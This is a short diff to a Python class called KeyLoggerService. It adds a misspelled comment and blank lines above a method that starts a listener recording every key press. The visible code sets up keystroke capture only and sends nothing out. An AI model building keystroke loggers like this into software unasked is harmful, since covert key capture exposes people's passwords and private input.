@@ -6,6 +6,9 @@ class KeyLoggerService(IKeyLogger):
         self.data = []
         self.listener = Listener(on_press=self.__on_press)
     
+    #The listener start to listen to everey press keybord
     def start_logging(self):
         self.listener.start()
+    
+
         
